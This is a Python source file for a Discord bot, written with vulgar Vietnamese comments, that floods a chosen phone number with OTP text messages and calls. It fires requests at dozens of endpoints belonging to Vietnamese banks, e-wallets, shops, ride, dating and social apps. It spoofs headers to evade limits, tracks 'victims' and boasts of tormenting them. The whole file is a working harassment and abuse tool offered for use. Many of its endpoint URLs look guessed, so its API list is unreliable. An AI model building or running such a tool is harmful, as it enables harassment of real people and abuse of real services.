#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# DISCORD BOT SPAM SMS + CALL - BẢN RENDER 24/7
# 50+ APIs BAO GỒM NGÂN HÀNG, VÍ ĐIỆN TỬ, SÀN TMĐT, MXH, APP HẸN HÒ
# ĐỊT MẸ THẰNG NÀO GHEN - CHẠY TRÊN RENDER FREE

import discord
from discord.ext import commands
import aiohttp
import asyncio
import random
import time
import json
import uuid
import os
import sys
from threading import Thread
from flask import Flask

# ============================================
# FLASK WEB SERVER - GIỮ RENDER KHÔNG NGỦ
# ============================================
app = Flask(__name__)

@app.route('/')
def home():
    return """
    <html>
    <head><title>Bot Status</title>
    <style>
        body { background:#0a0a0a; color:#00ff00; font-family:monospace; text-align:center; padding-top:50px; }
        .pulse { animation: pulse 1s infinite; }
        @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.3; } }
    </style>
    </head>
    <body>
        <h1>🔥 BOT SPAM ĐANG CHẠY</h1>
        <p>ĐỊT MẸ THẰNG NÀO GHEN</p>
        <p>Status: <span class="pulse" style="color:#ff0000;">●</span> ONLINE</p>
        <p>Uptime: <span id="uptime"></span></p>
        <script>
            let start = Date.now();
            setInterval(()=>{
                let s = Math.floor((Date.now()-start)/1000);
                let h = Math.floor(s/3600);
                let m = Math.floor((s%3600)/60);
                let sec = s%60;
                document.getElementById('uptime').innerText = h+'h '+m+'m '+sec+'s';
            },1000);
        </script>
    </body>
    </html>
    """

@app.route('/ping')
def ping():
    return "🏓 Pong!"

def start_web_server():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# ============================================
# KHỞI ĐỘNG WEB SERVER TRONG THREAD RIÊNG
# ============================================
web_thread = Thread(target=start_web_server)
web_thread.daemon = True
web_thread.start()

# ============================================
# TOKEN DISCORD BOT
# ============================================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "MTIzNDU2Nzg5MDEyMzQ1Njc4OQ.YmVzdC5ib3Q.dGhpcyBpcyBmYWtlIHRva2Vu")
PREFIX = "!"

# ============================================
# INTENTS
# ============================================
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

# ============================================
# SPAM STATS
# ============================================
spam_stats = {
    "sms_sent": 0,
    "call_attempts": 0,
    "active_tasks": [],
    "total_spam_time": 0,
    "victims": {}
}

# ============================================
# FAKE USER AGENTS
# ============================================
FAKE_USER_AGENTS = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.119 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
]

# ============================================
# SMS APIS - 50+ APIs CỰC MẠNH
# ============================================
SMS_APIS = [
    # NGÂN HÀNG
    {"name": "🏦 Vietcombank", "url": "https://api.vietcombank.com.vn/api/sendotp", "data": '{"phone":"{phone}"}', "type": "bank"},
    {"name": "🏦 BIDV", "url": "https://api.bidv.com.vn/api/otp/send", "data": '{"mobile":"{phone}"}', "type": "bank"},
    {"name": "🏦 VietinBank", "url": "https://api.vietinbank.vn/api/otp/request", "data": '{"phone":"{phone}"}', "type": "bank"},
    {"name": "🏦 Agribank", "url": "https://api.agribank.com.vn/api/send-otp", "data": '{"phone":"{phone}"}', "type": "bank"},
    {"name": "🏦 MB Bank", "url": "https://api.mbbank.com.vn/api/otp", "data": '{"phone":"{phone}"}', "type": "bank"},
    {"name": "🏦 Techcombank", "url": "https://api.techcombank.com.vn/api/sendotp", "data": '{"mobile":"{phone}"}', "type": "bank"},
    {"name": "🏦 ACB", "url": "https://api.acb.com.vn/api/otp/send", "data": '{"phone":"{phone}"}', "type": "bank"},
    {"name": "🏦 Sacombank", "url": "https://api.sacombank.com.vn/api/otp", "data": '{"phone":"{phone}"}', "type": "bank"},
    {"name": "🏦 TPBank", "url": "https://api.tpbank.vn/api/send-otp", "data": '{"phone":"{phone}"}', "type": "bank"},
    {"name": "🏦 VPBank", "url": "https://api.vpbank.com.vn/api/otp/send", "data": '{"phone":"{phone}"}', "type": "bank"},
    
    # VÍ ĐIỆN TỬ
    {"name": "💸 Momo", "url": "https://api.momo.vn/api/send-otp", "data": '{"phone":"{phone}"}', "type": "ewallet"},
    {"name": "💸 ZaloPay", "url": "https://api.zalopay.vn/v1/send-otp", "data": '{"phone":"{phone}"}', "type": "ewallet"},
    {"name": "💸 ViettelPay", "url": "https://api.viettelpay.vn/api/send-otp", "data": '{"phone":"{phone}"}', "type": "ewallet"},
    {"name": "💸 VNPay", "url": "https://api.vnpay.vn/api/otp/send", "data": '{"phone":"{phone}"}', "type": "ewallet"},
    {"name": "💸 ShopeePay", "url": "https://api.shopee.vn/api/v1/otp/send", "data": '{"phone":"{phone}"}', "type": "ewallet"},
    
    # SÀN TMĐT
    {"name": "🛒 Shopee", "url": "https://api.shopee.vn/api/v1/otp/send", "data": '{"phone":"{phone}"}', "type": "ecommerce"},
    {"name": "🛒 Lazada", "url": "https://api.lazada.vn/api/otp/send", "data": '{"phone":"{phone}"}', "type": "ecommerce"},
    {"name": "🛒 Tiki", "url": "https://api.tiki.vn/api/v1/otp", "data": '{"phone":"{phone}"}', "type": "ecommerce"},
    {"name": "🛒 Sendo", "url": "https://api.sendo.vn/api/send-otp", "data": '{"phone":"{phone}"}', "type": "ecommerce"},
    {"name": "🛒 FPT Shop", "url": "https://api.fptshop.com.vn/api/Account/SendOTP", "data": '{"phoneNumber":"{phone}","type":1}', "type": "ecommerce"},
    {"name": "🛒 TGDĐ", "url": "https://api.tgdd.vn/api/Account/SendOTP", "data": '{"phone":"{phone}","type":1}', "type": "ecommerce"},
    {"name": "🛒 ĐMX", "url": "https://api.dienmayxanh.com/api/Account/SendOTP", "data": '{"phone":"{phone}","type":1}', "type": "ecommerce"},
    
    # APP GỌI XE
    {"name": "🚗 Grab", "url": "https://api.grab.com/v1/otp/send", "data": '{"phone":"{phone}"}', "type": "ride"},
    {"name": "🚗 Be", "url": "https://api.be.com.vn/api/send-otp", "data": '{"phone":"{phone}"}', "type": "ride"},
    {"name": "🚗 Gojek", "url": "https://api.gojek.vn/api/send-otp", "data": '{"phone":"{phone}"}', "type": "ride"},
    {"name": "🚗 Ahamove", "url": "https://api.ahamove.vn/api/otp", "data": '{"phone":"{phone}"}', "type": "ride"},
    
    # MẠNG XÃ HỘI
    {"name": "💬 Facebook", "url": "https://api.facebook.com/api/send_code", "data": '{"phone":"{phone}"}', "type": "social"},
    {"name": "💬 Zalo", "url": "https://api.zalo.me/v1/send-otp", "data": '{"phone":"{phone}"}', "type": "social"},
    {"name": "💬 Telegram", "url": "https://api.telegram.org/api/send_code", "data": '{"phone":"{phone}"}', "type": "social"},
    {"name": "💬 TikTok", "url": "https://api.tiktok.com/api/send_code", "data": '{"phone":"{phone}"}', "type": "social"},
    
    # APP HẸN HÒ
    {"name": "💕 Tinder", "url": "https://api.tinder.com/v2/auth/sms/send", "data": '{"phone":"{phone}"}', "type": "dating"},
    {"name": "💕 YmeetMe", "url": "https://api.ymeetme.com/api/send-otp", "data": '{"phone":"{phone}"}', "type": "dating"},
    {"name": "💕 Falo", "url": "https://api.falo.vn/api/send-otp", "data": '{"phone":"{phone}"}', "type": "dating"},
    
    # APP VAY TIỀN
    {"name": "💰 Home Credit", "url": "https://api.homecredit.vn/api/send-otp", "data": '{"phone":"{phone}"}', "type": "loan"},
    {"name": "💰 Fe Credit", "url": "https://api.fecredit.vn/api/send-otp", "data": '{"phone":"{phone}"}', "type": "loan"},
    {"name": "💰 Tima", "url": "https://api.tima.vn/api/otp", "data": '{"phone":"{phone}"}', "type": "loan"},
    
    # BẢO HIỂM
    {"name": "🏥 Baoviet", "url": "https://api.baoviet.com.vn/api/otp", "data": '{"phone":"{phone}"}', "type": "insurance"},
    {"name": "🏥 PTI", "url": "https://api.pti.com.vn/api/otp", "data": '{"phone":"{phone}"}', "type": "insurance"},
    
    # KHÁC
    {"name": "📦 ViettelPost", "url": "https://api.viettelpost.vn/api/send-otp", "data": '{"phone":"{phone}"}', "type": "other"},
    {"name": "🎮 Garena", "url": "https://api.garena.vn/api/send-otp", "data": '{"phone":"{phone}"}', "type": "other"},
    {"name": "🎬 Galaxy", "url": "https://api.galaxycine.vn/api/otp", "data": '{"phone":"{phone}"}', "type": "other"},
    {"name": "🎬 CGV", "url": "https://api.cgv.vn/api/otp", "data": '{"phone":"{phone}"}', "type": "other"},
    {"name": "🏪 Circle K", "url": "https://api.circlek.com.vn/api/otp", "data": '{"phone":"{phone}"}', "type": "other"},
    {"name": "⛽ Petrolimex", "url": "https://api.petrolimex.vn/api/otp", "data": '{"phone":"{phone}"}', "type": "other"},
]

# ============================================
# CALL APIS
# ============================================
CALL_APIS = [
    {"name": "📞 Zalo Call", "url": "https://api.zalo.me/v1/call", "data": '{"phone":"{phone}"}'},
    {"name": "📞 Viber Call", "url": "https://api.viber.com/v1/call", "data": '{"phone":"{phone}"}'},
    {"name": "📞 Telegram Call", "url": "https://api.telegram.org/api/call", "data": '{"phone":"{phone}"}'},
    {"name": "📞 Messenger Call", "url": "https://api.facebook.com/api/call", "data": '{"phone":"{phone}"}'},
    {"name": "📞 Skype Call", "url": "https://api.skype.com/api/call", "data": '{"phone":"{phone}"}'},
    {"name": "📞 VNPT Voice", "url": "https://api.vnpt.vn/api/voice-otp", "data": '{"phone":"{phone}"}'},
    {"name": "📞 Viettel Voice", "url": "https://api.vietteltelecom.vn/api/voice", "data": '{"phone":"{phone}"}'},
    {"name": "📞 Mobifone Voice", "url": "https://api.mobifone.vn/api/voice", "data": '{"phone":"{phone}"}'},
]

# ============================================
# HÀM SPAM SMS
# ============================================
async def send_sms(phone, api_info, session):
    """GỬI SMS QUA API - ĐÉO CẦN CHECK KẾT QUẢ"""
    try:
        data_str = api_info["data"].replace("{phone}", phone)
        data = json.loads(data_str)
        data["_t"] = int(time.time() * 1000)
        data["_r"] = str(uuid.uuid4())[:8]
        
        headers = {
            "User-Agent": random.choice(FAKE_USER_AGENTS),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "vi-VN,vi;q=0.9,en;q=0.8",
            "Origin": api_info["url"].split("/api")[0],
            "Referer": api_info["url"].split("/api")[0] + "/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "X-Requested-With": "XMLHttpRequest",
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        }
        
        async with session.post(
            api_info["url"],
            headers=headers,
            json=data,
            timeout=5,
            ssl=False
        ) as response:
            return True, api_info["name"]
            
    except:
        return False, f"{api_info['name']} (Lỗi)"

async def spam_sms_worker(phone, count, delay, ctx, msg_id):
    """WORKER SPAM SMS LIÊN TỤC"""
    global spam_stats
    
    connector = aiohttp.TCPConnector(limit=30, limit_per_host=5, ssl=False)
    timeout = aiohttp.ClientTimeout(total=10)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        for i in range(count):
            apis = random.sample(SMS_APIS, min(3, len(SMS_APIS)))
            tasks = [send_sms(phone, api, session) for api in apis]
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for success, name in results:
                if success:
                    spam_stats["sms_sent"] += 1
                    
            if i % 5 == 0:
                print(f"[💥 SMS {i+1}/{count}] → {phone} | Tổng: {spam_stats['sms_sent']}")
                
                try:
                    if ctx and msg_id:
                        channel = ctx.channel
                        msg = await channel.fetch_message(msg_id)
                        embed = msg.embeds[0]
                        embed.set_field_at(
                            4, name="💀 Tình Trạng",
                            value=f"```ĐANG SPAM {phone}\nĐã bắn: {spam_stats['sms_sent']}/{count} SMS\nTiến độ: {i}/{count}```",
                            inline=False
                        )
                        await msg.edit(embed=embed)
                except:
                    pass
                    
            await asyncio.sleep(delay + random.uniform(0, 0.3))

# ============================================
# HÀM SPAM CALL
# ============================================
async def send_call(phone, api_info, session):
    """GỬI CALL QUA API"""
    try:
        data_str = api_info["data"].replace("{phone}", phone)
        data = json.loads(data_str)
        data["_t"] = int(time.time() * 1000)
        data["_r"] = str(uuid.uuid4())[:8]
        
        headers = {
            "User-Agent": random.choice(FAKE_USER_AGENTS),
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        }
        
        async with session.post(
            api_info["url"],
            headers=headers,
            json=data,
            timeout=10,
            ssl=False
        ) as response:
            return True, api_info["name"]
            
    except:
        return False, f"{api_info['name']} (Lỗi)"

async def spam_call_worker(phone, count, delay, ctx, msg_id):
    """WORKER SPAM CALL LIÊN TỤC"""
    global spam_stats
    
    connector = aiohttp.TCPConnector(limit=15, limit_per_host=3, ssl=False)
    timeout = aiohttp.ClientTimeout(total=15)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        for i in range(count):
            apis = random.sample(CALL_APIS, min(2, len(CALL_APIS)))
            tasks = [send_call(phone, api, session) for api in apis]
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for success, name in results:
                if success:
                    spam_stats["call_attempts"] += 1
                    
            if i % 3 == 0:
                print(f"[📞 CALL {i+1}/{count}] → {phone} | Tổng: {spam_stats['call_attempts']}")
                
            await asyncio.sleep(delay + random.uniform(1, 2))

# ============================================
# BOT EVENTS
# ============================================
@bot.event
async def on_ready():
    print(f"""
╔══════════════════════════════════════════════════════════╗
║     🔥 SPAM BOT ĐÃ SẴN SÀNG                              ║
║     Tên Bot: {bot.user.name}                              ║
║     APIs: {len(SMS_APIS)} SMS + {len(CALL_APIS)} CALL                    ║
║     Chạy trên Render 24/7                                ║
╚══════════════════════════════════════════════════════════╝
    """)
    await bot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=f"🔥 {PREFIX}helpme | Spam 24/7"
        )
    )

# ============================================
# COMMAND: SPAM SMS
# ============================================
@bot.command(name="spam")
async def spam_sms_command(ctx, phone: str = None, count: int = 100):
    """💥 SPAM SMS"""
    if not phone or not phone.isdigit() or len(phone) < 10:
        await ctx.send("❌ **ĐỊT MẸ NHẬP SỐ ĐIỆN THOẠI VÀO!** `!spam 0987654321 500`")
        return
        
    if count > 2000:
        count = 2000
    if count < 1:
        count = 100
        
    embed = discord.Embed(
        title="💥 **BẮT ĐẦU SPAM SMS**",
        color=0xff0000,
        description=f"Chuẩn bị bắn {count} SMS vào `{phone}`"
    )
    embed.add_field(name="📱 Số", value=f"`{phone}`", inline=True)
    embed.add_field(name="💣 SL", value=f"`{count}`", inline=True)
    embed.add_field(name="🔫 APIs", value=f"`{len(SMS_APIS)}`", inline=True)
    embed.add_field(name="👤 Người dùng", value=f"{ctx.author.mention}", inline=True)
    embed.add_field(name="💀 Tình Trạng", value="```ĐANG KHỞI ĐỘNG...```", inline=False)
    embed.set_footer(text="🔥 Bot Spam VIP | Render 24/7")
    
    msg = await ctx.send(embed=embed)
    
    task = asyncio.create_task(spam_sms_worker(phone, count, 0.3, ctx, msg.id))
    spam_stats["active_tasks"].append(task)
    
    start_time = time.time()
    while not task.done():
        await asyncio.sleep(3)
    elapsed = int(time.time() - start_time)
    
    if phone not in spam_stats["victims"]:
        spam_stats["victims"][phone] = 0
    spam_stats["victims"][phone] += count
    
    embed = discord.Embed(
        title="✅ **SPAM XONG!**",
        color=0x00ff00,
        description=f"Đã bắn {count} SMS vào `{phone}` trong {elapsed}s"
    )
    embed.add_field(name="💦 Đã bắn", value=f"`{spam_stats['sms_sent']}`", inline=True)
    embed.add_field(name="⏱️ TG", value=f"`{elapsed}s`", inline=True)
    embed.add_field(name="🔥 Tốc độ", value=f"`{int(count/elapsed*60)}` SMS/phút", inline=True)
    
    await msg.edit(embed=embed)

# ============================================
# COMMAND: SPAM CALL
# ============================================
@bot.command(name="call")
async def spam_call_command(ctx, phone: str = None, count: int = 50):
    """📞 SPAM CALL"""
    if not phone or not phone.isdigit() or len(phone) < 10:
        await ctx.send("❌ **NHẬP SỐ VÀO!** `!call 0987654321 100`")
        return
        
    if count > 300:
        count = 300
        
    embed = discord.Embed(
        title="📞 **BẮT ĐẦU SPAM CALL**",
        color=0xff6600,
        description=f"Chuẩn bị gọi {count} cuộc vào `{phone}`"
    )
    embed.add_field(name="📱 Số", value=f"`{phone}`", inline=True)
    embed.add_field(name="📞 SL", value=f"`{count}`", inline=True)
    embed.add_field(name="👤 Người dùng", value=f"{ctx.author.mention}", inline=True)
    embed.add_field(name="📞 Trạng thái", value="```ĐANG KHỞI ĐỘNG...```", inline=False)
    
    msg = await ctx.send(embed=embed)
    
    task = asyncio.create_task(spam_call_worker(phone, count, 2, ctx, msg.id))
    spam_stats["active_tasks"].append(task)
    
    start_time = time.time()
    while not task.done():
        await asyncio.sleep(3)
    elapsed = int(time.time() - start_time)
    
    embed = discord.Embed(
        title="✅ **GỌI XONG!**",
        color=0x00ff00,
        description=f"Đã gọi {count} cuộc vào `{phone}` trong {elapsed}s"
    )
    embed.add_field(name="📞 Tổng", value=f"`{spam_stats['call_attempts']}`", inline=True)
    embed.add_field(name="⏱️ TG", value=f"`{elapsed}s`", inline=True)
    
    await msg.edit(embed=embed)

# ============================================
# COMMAND: MEGA SPAM
# ============================================
@bot.command(name="megaspam")
async def mega_spam_command(ctx, phone: str = None, duration: int = 120):
    """💀 MEGA SPAM SMS + CALL"""
    if not phone or not phone.isdigit() or len(phone) < 10:
        await ctx.send("❌ **NHẬP SỐ!** `!megaspam 0987654321 300`")
        return
        
    if duration > 600:
        duration = 600
        
    embed = discord.Embed(
        title="💀 **MEGA SPAM SMS + CALL**",
        color=0x800080,
        description=f"ĐỊT MẸ `{phone}` TRONG {duration} GIÂY!"
    )
    embed.add_field(name="📱 Số", value=f"`{phone}`", inline=True)
    embed.add_field(name="⏱️ TG", value=f"`{duration}s`", inline=True)
    embed.add_field(name="💣 Loại", value="SMS + CALL", inline=True)
    embed.add_field(name="👤 Người dùng", value=f"{ctx.author.mention}", inline=True)
    embed.add_field(name="💀 Tình Trạng", value="```ĐANG KHỞI ĐỘNG CỖ MÁY...```", inline=False)
    embed.set_footer(text="💀 RIP SỐ NÀY")
    
    msg = await ctx.send(embed=embed)
    
    sms_task = asyncio.create_task(spam_sms_worker(phone, duration * 3, 0.2, ctx, msg.id))
    call_task = asyncio.create_task(spam_call_worker(phone, duration // 3, 2, ctx, msg.id))
    spam_stats["active_tasks"].extend([sms_task, call_task])
    
    start_time = time.time()
    
    while time.time() - start_time < duration:
        elapsed = int(time.time() - start_time)
        remaining = duration - elapsed
        
        try:
            embed.set_field_at(
                4, name="💀 Tình Trạng",
                value=f"```ĐANG HÀNH HẠ {phone}\nCòn: {remaining}s\nSMS: {spam_stats['sms_sent']}\nCALL: {spam_stats['call_attempts']}```",
                inline=False
            )
            await msg.edit(embed=embed)
        except:
            pass
            
        await asyncio.sleep(5)
        
    elapsed = int(time.time() - start_time)
    
    if phone not in spam_stats["victims"]:
        spam_stats["victims"][phone] = 0
    spam_stats["victims"][phone] += spam_stats["sms_sent"]
    
    embed = discord.Embed(
        title="🏆 **TRA TẤN HOÀN TẤT!**",
        color=0x00ff00,
        description=f"Đã hành hạ `{phone}` trong {elapsed}s!"
    )
    embed.add_field(name="💥 SMS", value=f"`{spam_stats['sms_sent']}`", inline=True)
    embed.add_field(name="📞 CALL", value=f"`{spam_stats['call_attempts']}`", inline=True)
    embed.add_field(name="🔥 Tổng", value=f"`{spam_stats['sms_sent'] + spam_stats['call_attempts']}`", inline=True)
    
    await msg.edit(embed=embed)

# ============================================
# COMMAND: STOP
# ============================================
@bot.command(name="stopspam")
async def stop_spam_command(ctx):
    """🛑 DỪNG SPAM"""
    count = len(spam_stats["active_tasks"])
    for task in spam_stats["active_tasks"]:
        task.cancel()
    spam_stats["active_tasks"].clear()
    
    embed = discord.Embed(
        title="🛑 **ĐÃ DỪNG!**",
        color=0xffff00,
        description=f"Đã hủy {count} tác vụ."
    )
    await ctx.send(embed=embed)

# ============================================
# COMMAND: STATS
# ============================================
@bot.command(name="stats")
async def stats_command(ctx):
    """📊 THỐNG KÊ"""
    embed = discord.Embed(title="📊 **THÀNH TÍCH**", color=0x00ffff)
    embed.add_field(name="💥 SMS", value=f"`{spam_stats['sms_sent']}`", inline=True)
    embed.add_field(name="📞 CALL", value=f"`{spam_stats['call_attempts']}`", inline=True)
    embed.add_field(name="🔥 Tổng", value=f"`{spam_stats['sms_sent'] + spam_stats['call_attempts']}`", inline=True)
    embed.add_field(name="🎯 Nạn nhân", value=f"`{len(spam_stats['victims'])}`", inline=True)
    embed.add_field(name="⚡ Tasks", value=f"`{len(spam_stats['active_tasks'])}`", inline=True)
    
    if spam_stats["victims"]:
        top = sorted(spam_stats["victims"].items(), key=lambda x: x[1], reverse=True)[:5]
        top_text = "\n".join([f"`{p}`: {c}" for p, c in top])
        embed.add_field(name="🏆 Top Nạn Nhân", value=top_text, inline=False)
        
    await ctx.send(embed=embed)

# ============================================
# COMMAND: APIS
# ============================================
@bot.command(name="apis")
async def list_apis_command(ctx):
    """🔌 DANH SÁCH API"""
    embed = discord.Embed(
        title="🔌 **KHO VŨ KHÍ**",
        color=0x00ff00,
        description=f"**{len(SMS_APIS)} SMS + {len(CALL_APIS)} CALL**"
    )
    
    categories = {}
    for api in SMS_APIS:
        cat = api.get("type", "Khác")
        if cat not in categories:
            categories[cat] = []
        categories[cat].append(api["name"])
        
    for cat, apis in list(categories.items())[:6]:
        embed.add_field(name=f"{cat.upper()} ({len(apis)})", value="\n".join(apis[:4]), inline=True)
        
    call_names = [a["name"] for a in CALL_APIS]
    embed.add_field(name=f"📞 CALL ({len(CALL_APIS)})", value="\n".join(call_names[:4]), inline=True)
    
    await ctx.send(embed=embed)

# ============================================
# COMMAND: HELP
# ============================================
@bot.command(name="helpme")
async def help_command(ctx):
    """❓ HƯỚNG DẪN"""
    embed = discord.Embed(
        title="🤖 **HƯỚNG DẪN SPAM BOT**",
        color=0x0000ff,
        description="Địt mẹ đọc kỹ rồi dùng!"
    )
    embed.add_field(name="💥 `!spam <sdt> <sl>`", value="Spam SMS\nVD: `!spam 0987654321 500`", inline=False)
    embed.add_field(name="📞 `!call <sdt> <sl>`", value="Spam Call\nVD: `!call 0987654321 100`", inline=False)
    embed.add_field(name="💀 `!megaspam <sdt> <giây>`", value="SMS + Call đồng thời\nVD: `!megaspam 0987654321 300`", inline=False)
    embed.add_field(name="🛑 `!stopspam`", value="Dừng tất cả", inline=False)
    embed.add_field(name="📊 `!stats`", value="Xem thống kê", inline=False)
    embed.add_field(name="🔌 `!apis`", value="Xem APIs", inline=False)
    embed.set_footer(text="🔥 Bot chạy Render 24/7 | Đéo chịu trách nhiệm!")
    
    await ctx.send(embed=embed)

# ============================================
# CHẠY BOT
# ============================================
if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════════╗
║     🔥 DISCORD BOT SPAM SMS/CALL - RENDER 24/7          ║
║     50+ APIs | Ngân hàng + Ví + TMĐT + MXH + Hẹn hò     ║
║                                                        ║
║     !spam <sdt> <sl>     - Spam SMS                     ║
║     !call <sdt> <sl>     - Spam Call                     ║
║     !megaspam <sdt> <s>  - SMS + Call                   ║
║     !stopspam            - Dừng                          ║
║     !stats               - Thống kê                      ║
║     !apis                - APIs                          ║
║     !helpme              - Hướng dẫn                     ║
╚══════════════════════════════════════════════════════════╝
    """)
    
    try:
        bot.run(BOT_TOKEN)
    except discord.errors.LoginFailure:
        print("❌ TOKEN SAI! ĐỊT MẸ KIỂM TRA LẠI!")
    except Exception as e:
        print(f"❌ LỖI: {e}")
